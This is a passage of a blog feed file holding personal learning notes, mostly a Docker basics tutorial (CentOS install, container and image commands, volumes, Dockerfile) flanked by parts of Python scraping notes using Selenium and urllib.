punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriveroptions <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--proxy-server=http://ip:port"</span><span class="token punctuation">)</span>web <span class="token operator">=</span> Chrome<span class="token punctuation">(</span>chrome_options<span class="token operator">=</span>options<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="保存页面截图"><a href="#保存页面截图" class="headerlink" title="保存页面截图"></a>保存页面截图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>save_screenshot<span class="token punctuation">(</span><span class="token string">'a.jpg'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="爬取百度校招职位"><a href="#爬取百度校招职位" class="headerlink" title="爬取百度校招职位"></a>爬取百度校招职位</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditionsdriver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"https://talent.baidu.com/external/baidu/campus.html#/jobList"</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    div <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>driver<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>        expected_conditions<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span>            <span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> <span class="token string">'//*[@id="campus-job-list"]/div/div[2]/div[1]/div/div[2]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>    list_row <span class="token operator">=</span> div<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'list-row'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> list_row<span class="token punctuation">:</span>        a_element <span class="token operator">=</span> each<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/a'</span><span class="token punctuation">)</span>        job_link <span class="token operator">=</span> a_element<span class="token punctuation">.</span>get_property<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>        job_name <span class="token operator">=</span> a_element<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>job_link<span class="token operator">+</span><span class="token string">" - "</span><span class="token operator">+</span>job_name<span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    driver<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker基础</title>
      <link href="/2021/07/29/Docker%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/07/29/Docker%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>关于Docker的一些基础知识及部署命令</p><h2 id="documents-and-library"><a href="#documents-and-library" class="headerlink" title="documents and library"></a>documents and library</h2><p><code>https://docs.docker.com/</code></p><p><code>https://hub.docker.com/</code></p><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p>Docker needs the version of CentOS kernel &gt; <code>3.10</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[ezy@localhost ~]$ uname -r3.10.0-693.el7.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# yum install -y yum-utils device-mapper-persistent-data lvm2[root@localhost ezy]# yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo[root@localhost ezy]# yum install docker-ce docker-ce-cli containerd.io[root@localhost ezy]# systemctl start docker # start docker[root@localhost ezy]# systemctl enable docker #设置开机启动Created symlink from &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;docker.service to &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service.[root@localhost ezy]# docker versionClient: Docker Engine - Community Version:           19.03.13 API version:       1.40 Go version:        go1.13.15 Git commit:        4484c46d9d Built:             Wed Sep 16 17:03:45 2020 OS&#x2F;Arch:           linux&#x2F;amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          19.03.13  API version:      1.40 (minimum version 1.12)  Go version:       go1.13.15  Git commit:       4484c46d9d  Built:            Wed Sep 16 17:02:21 2020  OS&#x2F;Arch:          linux&#x2F;amd64  Experimental:     false containerd:  Version:          1.3.7  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175 runc:  Version:          1.0.0-rc10  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd docker-init:  Version:          0.18.0  GitCommit:        fec3683<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Docker-HelloWorld-test"><a href="#Docker-HelloWorld-test" class="headerlink" title="Docker HelloWorld test"></a>Docker HelloWorld test</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# docker run hello-worldUnable to find image &#39;hello-world:latest&#39; locallylatest: Pulling from library&#x2F;hello-world0e03bdcc26d7: Pull complete Digest: sha256:8c5aeeb6a5f3ba4883347d3747a7249f491766ca1caa47e5da5dfcf6b9b717c0Status: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.    (amd64) 3. The Docker daemon created a new container from that image which runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it    to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https:&#x2F;&#x2F;hub.docker.com&#x2F;For more examples and ideas, visit: https:&#x2F;&#x2F;docs.docker.com&#x2F;get-started&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="config-Aliyun-images-repositories-to-speed-up-downloading-images"><a href="#config-Aliyun-images-repositories-to-speed-up-downloading-images" class="headerlink" title="config Aliyun images repositories(to speed up downloading images)"></a>config Aliyun images repositories(to speed up downloading images)</h2><ol><li>Through logging into the Aliyun official website, enter into the container image service.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/docker/docker-f1.png" alt="image-20201111221517543"></p><ol start="2"><li>create <code>daemon.json</code> file in the <code>/etc/docker</code>. </li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/docker/docker-f2.png" alt="image-20201111222029063"></p><ol start="3"><li><p>reboot daemon</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# systemctl daemon-reload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>reboot docker service</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>test</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/docker/docker-f3.png" alt="image-20201111222434755"></p></li></ol><h2 id="Basic-commands"><a href="#Basic-commands" class="headerlink" title="Basic commands"></a>Basic commands</h2><h4 id="start-stop-restart-docker"><a href="#start-stop-restart-docker" class="headerlink" title="start, stop, restart docker"></a>start, stop, restart docker</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# systemctl start docker[root@localhost docker]# systemctl stop docker[root@localhost docker]# systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="view-information"><a href="#view-information" class="headerlink" title="view information"></a>view information</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="check-help-documents"><a href="#check-help-documents" class="headerlink" title="check help documents"></a>check help documents</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker --help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="check-version"><a href="#check-version" class="headerlink" title="check version"></a>check version</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="list-all-the-images-in-the-local-machine"><a href="#list-all-the-images-in-the-local-machine" class="headerlink" title="list all the images in the local machine"></a>list all the images in the local machine</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="search-images-on-line"><a href="#search-images-on-line" class="headerlink" title="search images on line"></a>search images on line</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker search tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="download-images"><a href="#download-images" class="headerlink" title="download images"></a>download images</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker pull nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>docker pull image_name:[tag]</code> </p><p>It will download the latest version if doesn’t append <code>tag</code>. </p><h4 id="delete-images"><a href="#delete-images" class="headerlink" title="delete images"></a>delete images</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker rmi redis:4.0.14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>add <code>-f</code> can stop the executing image and delete it.</p><p><code>docker rmi -f redis:4.0.14</code></p><h4 id="create-and-start-container"><a href="#create-and-start-container" class="headerlink" title="create and start container"></a>create and start container</h4><p><code>docker run [options] image [command] [args]</code></p><p>-i: run the container in interactive mode</p><p>-t: reassigned a pseudo-input terminal for the container</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it --name mycentos1 7e6257[root@da03311a5f05 &#x2F;]# lsanaconda-post.log  dev  home  lib64  mnt  proc  run   srv  tmp  varbin                etc  lib   media  opt  root  sbin  sys  usr[root@da03311a5f05 &#x2F;]# exitexit[root@localhost docker]# docker run -it --name mycentos2 7e6257[root@1be4b28c607a &#x2F;]# lsanaconda-post.log  dev  home  lib64  mnt  proc  run   srv  tmp  varbin                etc  lib   media  opt  root  sbin  sys  usr[root@1be4b28c607a &#x2F;]# exitexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="list-the-running-containers"><a href="#list-the-running-containers" class="headerlink" title="list the running containers"></a>list the running containers</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         30 seconds ago      Up 28 seconds                           mycentos3[root@localhost ezy]# docker ps -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         2 minutes ago       Up 2 minutes                                   mycentos31be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         4 minutes ago       Exited (0) 4 minutes ago                       mycentos2da03311a5f05        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         4 minutes ago       Exited (0) 4 minutes ago                       mycentos179dcf3b46b21        hello-world         &quot;&#x2F;hello&quot;            3 hours ago         Exited (0) 3 hours ago                         nervous_driscoll9644f1edbca7        hello-world         &quot;&#x2F;hello&quot;            3 hours ago         Exited (0) 3 hours ago                         gracious_roentgen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>list the 2 containers that were recently created</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# docker ps -n 2CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         3 minutes ago       Up 3 minutes                                   mycentos31be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         5 minutes ago       Exited (0) 5 minutes ago                       mycentos2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exit-the-container"><a href="#exit-the-container" class="headerlink" title="exit the container"></a>exit the container</h4><p><code>exit</code> stop and exit</p><p> <code>Ctrl+P+Q</code> not stop and exit</p><h4 id="enter-into-the-container"><a href="#enter-into-the-container" class="headerlink" title="enter into the container"></a>enter into the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMESe23da60755cb        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         8 minutes ago       Up 8 minutes                            mycentos3[root@localhost docker]# docker attach e23da[root@e23da60755cb &#x2F;]# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="start-the-exited-container"><a href="#start-the-exited-container" class="headerlink" title="start the exited container"></a>start the exited container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker ps -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES1be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         13 minutes ago      Exited (0) 13 minutes ago                       mycentos2[root@localhost docker]# docker start 1be4b28c607a1be4b28c607a[root@localhost docker]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES1be4b28c607a        7e6257              &quot;&#x2F;bin&#x2F;bash&quot;         14 minutes ago      Up 2 seconds                            mycentos2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="restart-the-container"><a href="#restart-the-container" class="headerlink" title="restart the container"></a>restart the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker restart 1be4b28c607a1be4b28c607a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="stop-the-container"><a href="#stop-the-container" class="headerlink" title="stop the container"></a>stop the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker stop 1be4b28c607a1be4b28c607a[root@localhost docker]# docker psCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="delete-the-container"><a href="#delete-the-container" class="headerlink" title="delete the container"></a>delete the container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker rm 1be4b28c607a1be4b28c607a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>can add <code>-f</code> to delete forcefully </p><h2 id="Advanced-commands"><a href="#Advanced-commands" class="headerlink" title="Advanced commands"></a>Advanced commands</h2><h4 id="create-and-start-the-container-in-a-daemon-manner"><a href="#create-and-start-the-container-in-a-daemon-manner" class="headerlink" title="create and start the container in a daemon manner"></a>create and start the container in a daemon manner</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -di --name mycentos01 7e6257c9f8d81a0d0496deffaa59b6e456db6a36b958cdc541fadf0d732291d6a1ab30bc2507[root@localhost docker]# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>It doesn’t enter the container after startup.</p><h4 id="operate-the-container-directly-and-return-to-the-host-terminal-after-execution"><a href="#operate-the-container-directly-and-return-to-the-host-terminal-after-execution" class="headerlink" title="operate the container directly and return to the host terminal after execution"></a>operate the container directly and return to the host terminal after execution</h4><p>For example, start the application in the container, such as nginx, tomcat, etc.</p><p><code>docker exec -it ID command</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker exec -it 1a0d04 ls -l &#x2F;systotal 0drwxr-xr-x.   2 root root  0 Nov 11 15:30 blockdrwxr-xr-x.  28 root root  0 Nov 11 15:30 busdrwxr-xr-x.  53 root root  0 Nov 11 15:30 classdrwxr-xr-x.   4 root root  0 Nov 11 15:30 devdrwxr-xr-x.  12 root root  0 Nov 11 15:30 devicesdrwxrwxrwt.   2 root root 40 Nov 11 15:22 firmwaredrwxr-xr-x.   7 root root  0 Nov 11 15:22 fsdrwxr-xr-x.   2 root root  0 Nov 11 15:30 hypervisordrwxr-xr-x.   9 root root  0 Nov 11 15:30 kerneldrwxr-xr-x. 185 root root  0 Nov 11 15:30 moduledrwxr-xr-x.   2 root root  0 Nov 11 15:30 power<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="check-the-logs-of-container"><a href="#check-the-logs-of-container" class="headerlink" title="check the logs of container"></a>check the logs of container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker logs 1a0d04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="check-the-processes-of-container"><a href="#check-the-processes-of-container" class="headerlink" title="check the processes of container"></a>check the processes of container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker top 1a0d04UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                81635               81619               0                   07:22               ?                   00:00:00            &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="copy-the-files-between-host-machine-and-container"><a href="#copy-the-files-between-host-machine-and-container" class="headerlink" title="copy the files between host machine and container"></a>copy the files between host machine and container</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker cp &#x2F;etc&#x2F;docker&#x2F;key.json 1a0d04:&#x2F;tmp[root@localhost docker]# docker exec -it 1a0d04 ls -l &#x2F;tmptotal 8-rw-------. 1 root root 244 Nov 11 12:22 key.json[root@localhost docker]# docker cp 1a0d04:&#x2F;tmp&#x2F;key.json &#x2F;home[root@localhost docker]# ls &#x2F;homedata  ezy  key.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="port-mapping-between-docker-and-host"><a href="#port-mapping-between-docker-and-host" class="headerlink" title="port mapping between docker and host"></a>port mapping between docker and host</h2><p><code>docker run -it -p host:docker imageID</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it -p 8888:8080 e3a3935<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="submit-image"><a href="#submit-image" class="headerlink" title="submit image"></a>submit image</h2><p>save the changes and configuration in the docker and commit it into new image in the local machine</p><p><code>docker commit -a=&#39;author&#39; -m=&#39;comment&#39; ID newImageName</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker commit -a &#39;ezy&#39; -m &#39;ezy01&#39; e39 ezy0812&#x2F;centos7:1.0sha256:59c3e732e8139c33cc86a2c19d3030b189ea8fd8b92c5b0cf0649a034acbfe3d[root@localhost docker]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEezy0812&#x2F;centos7     1.0                 59c3e732e813        3 seconds ago       203MBcentos              7                   7e6257c9f8d8        3 months ago        203MBhello-world         latest              bf756fb1ae65        10 months ago       13.3kB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="push-the-self-made-images-to-the-hub-remote-server"><a href="#push-the-self-made-images-to-the-hub-remote-server" class="headerlink" title="push the self-made images to the hub remote server"></a>push the self-made images to the hub remote server</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker login[root@localhost docker]# docker push ezy0812&#x2F;centos7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="push-the-self-made-images-to-the-Aliyun-remote-server"><a href="#push-the-self-made-images-to-the-Aliyun-remote-server" class="headerlink" title="push the self-made images to the Aliyun remote server"></a>push the self-made images to the Aliyun remote server</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker login --username&#x3D;ezy_8 registry.cn-hangzhou.aliyuncs.com[root@localhost docker]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEezy0812&#x2F;centos7     1.0                 59c3e732e813        12 minutes ago      203MBcentos              7                   7e6257c9f8d8        3 months ago        203MBhello-world         latest              bf756fb1ae65        10 months ago       13.3kB[root@localhost docker]# docker tag 59c3e732e813 registry.cn-hangzhou.aliyuncs.com&#x2F;ezy0812&#x2F;centos7:1.0.1[root@localhost docker]# docker imagesREPOSITORY                                          TAG                 IMAGE ID            CREATED             SIZEezy0812&#x2F;centos7                                     1.0                 59c3e732e813        13 minutes ago      203MBregistry.cn-hangzhou.aliyuncs.com&#x2F;ezy0812&#x2F;centos7   1.0.1               59c3e732e813        13 minutes ago      203MBcentos                                              7                   7e6257c9f8d8        3 months ago        203MBhello-world                                         latest              bf756fb1ae65        10 months ago       13.3kB[root@localhost docker]# docker push registry.cn-hangzhou.aliyuncs.com&#x2F;ezy0812&#x2F;centos7:1.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="docker-directory-mount"><a href="#docker-directory-mount" class="headerlink" title="docker directory mount"></a>docker directory mount</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it -v &#x2F;home&#x2F;hdata:&#x2F;cdata 7e6257[root@localhost docker]# docker run -it -v &#x2F;home&#x2F;hdata:&#x2F;cdata -v &#x2F;home&#x2F;hdata2:&#x2F;cdata2 7e6257<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>If the mount of multiple directories has permissions denied, then add <code>--privileged=true</code></p><p>make the mount directory read-only</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker run -it -v &#x2F;home&#x2F;hdata:&#x2F;cdata:ro 7e6257<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="docker-migration-and-backup"><a href="#docker-migration-and-backup" class="headerlink" title="docker migration and backup"></a>docker migration and backup</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker save -o mytomcat7.7.tar ezy0812&#x2F;tomcat:1.0 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Recover-on-other-machine"><a href="#Recover-on-other-machine" class="headerlink" title="Recover on other machine"></a>Recover on other machine</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker load -i mytomcat7.7.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h2><table><thead><tr><th>FROM image_name:tag</th><th>Define which base image is used to start the build process</th></tr></thead><tbody><tr><td>MAINTAINER user_info</td><td>Declare the image maintainer information</td></tr><tr><td>LABEL key value</td><td>image description meta information</td></tr><tr><td>ENV key value</td><td>set environment variable</td></tr><tr><td>RUN command</td><td>The commands to run when building the container</td></tr><tr><td>WORKDIR path_dir</td><td>set the working directory when the terminal is logged in by default</td></tr><tr><td>EXPOSE port</td><td>the port the current container is exposed to</td></tr><tr><td>ADD source_dir/file dest_dir/file</td><td>copy the file of host machine to the container, if it’s a compressed file, it can unzip after copying automatically</td></tr><tr><td>COPY source_dir/file dest_dir/file</td><td>similar to <code>ADD</code>, but if it’s a compressed file, it cannot unzip</td></tr><tr><td>VOLUME</td><td>create a mount point that can be mounted from a local host or other container, typically to hold databases, data that needs to be held, etc.</td></tr><tr><td>CMD</td><td>specify the command to run when the container starts, if there are multiple commands, then the last one work</td></tr><tr><td>ENTRYPOINT</td><td>specify the command to run when the container starts</td></tr><tr><td>ONBUILD</td><td>the command to run when building an inherited DockerFile. The ONBUILD of the parent image inherits from the parent image in the quilt image is triggered</td></tr></tbody></table><h3 id="1-write-the-DockerFile"><a href="#1-write-the-DockerFile" class="headerlink" title="1. write the DockerFile"></a>1. write the DockerFile</h3><p><code>mycentosDockerFile</code></p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> centos</span><span class="token instruction"><span class="token keyword">MAINTAINER</span> ezy&lt;ezy0812@163.com></span><span class="token instruction"><span class="token keyword">LABEL</span> name=<span class="token string">"ezy0812 CentOS image"</span> build-date=<span class="token string">"20201112"</span></span><span class="token instruction"><span class="token keyword">ENV</span> WORKPATH /home/</span><span class="token instruction"><span class="token keyword">WORKDIR</span> <span class="token variable">$WORKPATH</span></span><span class="token instruction"><span class="token keyword">RUN</span> yum -y install net-tools</span><span class="token instruction"><span class="token keyword">RUN</span> yum -y install vim</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 80</span><span class="token instruction"><span class="token keyword">CMD</span> /bin/bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-build"><a href="#2-build" class="headerlink" title="2. build"></a>2. build</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost home]# docker build -f mycentosDockerFile -t ezy0812&#x2F;centos7:v1 .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pay attention to the point in the end, it’s the grammar.</p>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-spider</title>
      <link href="/2020/05/02/python-spider/"/>
      <url>/2020/05/02/python-spider/</url>
      
        <content type="html"><![CDATA[<p>主要介绍爬虫常用库 <code>urllib</code>, <code>bs4</code>, <code>re</code>, <code>xlwt</code>等的使用和豆瓣Top250爬取实例</p><h2 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment"># GET请求</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com/"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token comment">#建议使用utf-8解码，使得返回的内容更人性化的显示</span><span class="token comment"># POST请求</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse                 data<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"hello"</span><span class="token punctuation">:</span><span class="token string">"world"</span><span class="token punctuation">&#125;</span><span 